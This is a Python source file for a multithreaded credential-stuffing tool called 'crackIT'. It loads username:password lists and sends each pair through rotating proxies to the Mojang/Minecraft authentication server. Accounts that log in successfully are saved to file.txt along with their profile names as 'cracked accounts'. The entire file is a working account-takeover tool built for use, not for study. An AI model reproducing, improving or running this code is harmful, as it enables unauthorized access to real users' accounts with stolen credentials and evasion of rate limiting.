import library
import time
import threading
import os
from queue import Queue
import requests
from random import randint
import json
class crackIT:
	def __init__(self, debug):
		if debug == 1:
			self.debug = True
		else:
			self.debug = False
		file_txt = os.path.isfile('file.txt')
		if file_txt == False:
			open('file.txt', 'w')
		self.threadcount = self.input_threadcount()
		self.accountfile = self.open_accountfile()
		self.accounts_length = len(self.accountfile)
		self.accounts_parsed = self.account_parser() 
		self.proxy_array = self.CheckProxyFile()
		#self.socks_array = self.CheckSocksFile()
		self.WorkingAccounts = []
		self.active_threads = 0
		self.method = 'https'
		self.started_time = time.time()
		self.BadAccounts = []
		self.CheckingIteration = []
		self.cpu_timer = 0
		self.avg_count = 0
		self.Queued_iteation_count = 0
		self.threadedArray = []
		self.FailedAccounts = []
		self.SettingTaskQueue()
		while True:
			if len(self.FailedAccounts) > 0:
				self.Queued_iteation_count = 0
				self.accounts_parsed = self.FailedAccounts
				self.accounts_length = len(self.accounts_parsed)
				
				self.FailedAccounts = []
				self.threadedArray = []
				self.SettingTaskQueue()
			else:
				break
		var = []

		with open('file.txt', 'r') as f:
			open('file_Done', 'w')
			ff = f.read().split('\n')
		for x in range(len(ff)):
			var.append(ff[x].split(':'))
		m = open('file_Done', 'a')
		for x in range(len(var)):
			try:
				var[x][2]
			except:
				pass
			else:
				m.write(var[x][0]+":"+var[x][1]+":"+var[x][2] + "\n")
	def input_threadcount(self):
		while True:
			threadcount = input("How Many Threads: ")
			if threadcount == '':
				threadcount = 200
			try:
				threadcount = int(threadcount)
			except TypeError:
				pass
			else:
				return threadcount
	def CheckSocksFile(self):
		try:
			ProxiesFile = library.readIT().f(filename="socks.txt")
		except:
			raise FileExistsError("Hey Dipshit! Try Getting Some socks (socks.txt)")
		return ProxiesFile

	def open_accountfile(self):
		while True:
			accountfile = input("Name Of Account File: ")
			if accountfile == '':
				accountfile = "accounts.txt"
			try:
				accountfile = str(accountfile)
			except TypeError:
				continue
			else:
				if '.txt' not in accountfile:
					accountfile = accountfile + '.txt'

				try:
					open(accountfile, 'r')
				except FileExistsError:
					continue
				else:
					accountfile = library.readIT().f(filename=accountfile)
					return accountfile

	def account_parser(self):
		TempArray = self.accountfile
		for x in range(self.accounts_length):
			TempArray[x] = self.accountfile[x].split(":")
		return TempArray

	def CheckProxyFile(self):
		try:
			ProxiesFile = library.readIT().f(filename="proxies.txt")
		except:
			raise FileExistsError("Hey Dipshit! Try Getting Some Proxies (proxies.txt)")
		return ProxiesFile




	def SettingTaskQueue(self):
		def threader():
			while True:
				Temp_Get_Array = queue.get()
				worker = Temp_Get_Array[0]
				account = Temp_Get_Array[1]
				self.cracker(account, worker)
				queue.task_done()
		queue = Queue()
		for null in range(self.threadcount):
			t = threading.Thread(target=threader)
			t.daemon = True
			self.threadedArray.append(t)
			t.start()

		for worker in range(len(self.accounts_parsed)):
			Temp_Get_Array = [worker, self.accounts_parsed[self.Queued_iteation_count]]
			queue.put(Temp_Get_Array)
			self.Queued_iteation_count += 1
		for i in range(self.threadcount):
			queue.put(None)
		for t in self.threadedArray:
			t.join()
		print('Entire job took:',time.time() - self.started_time)
		print(self.WorkingAccounts)


	def cracker(self, account, worker):
		self.active_threads += 1
		self.cpu_timer += 1
		timevar = time.strftime("%S")
		if timevar == '0' and self.avg_count % 2 == 0:
			self.avg_count += 1

		elif timevar == '10':
			self.avg_count += 1


		if self.cpu_timer % (self.threadcount / 20) == 0 and self.debug is False:
			
			os.system('title   Current Threads: [' + str(self.active_threads) + "]   Progress: [" + str(round(int(worker) / int(self.accounts_length), 4) * 100) + "%] [" + str(worker) + "/" + str(self.accounts_length) + "]    Cracked Accounts: [" + str(len(self.WorkingAccounts)) + "]")
		elif self.debug:
			os.system('title Debug Mode  Current Threads: [' + str(self.active_threads) + "]   Progress: [" + str(round(int(worker) / int(self.accounts_length), 4) * 100) + "%] [" + str(worker) + "/" + str(self.accounts_length) + "]    Cracked Accounts: [" + str(len(self.WorkingAccounts)) + "]    Current Thread: [T-" + str(worker) + "]")
		try:
			payload = {
					"agent": {
						"name": "Minecraft",
						"version": 1

					},
					"clientToken":"1",
					"username": account[0],
					"password": account[1],
					}
		except:
			pass
		else:
			attempts = 0
			while True:
				try:
					Current_Socks = str(self.proxy_array[randint(0, len(self.proxy_array) - 1)])
					response = requests.post(
						'https://authserver.mojang.com/authenticate',

						headers={'User-Agent': 'MCU-Yggdrasil/1.0', 'Content-Type': 'application/json; charset=utf-8', 'Content-Language': 'en-US'},

						proxies={self.method:'https://'+Current_Socks},

						timeout=15,

						data=json.dumps(payload),
					)
				except IOError:
					attempts += 1
					if attempts > 20:
						break
					continue
				else:
					try:
						response.json()
					except:
						continue
					else:
						JsonArray = response.json()
						if 'error' not in JsonArray:
							f = open('file.txt', 'a')
							try:		
								f.write(str(account[0]) + ":" + str(account[1]) + ":" + str(JsonArray['selectedProfile']['name'] + "\n"))
								self.WorkingAccounts.append(str(account))
							except:
								pass
					break
				
		print_lock = threading.Lock()
		self.active_threads -= 1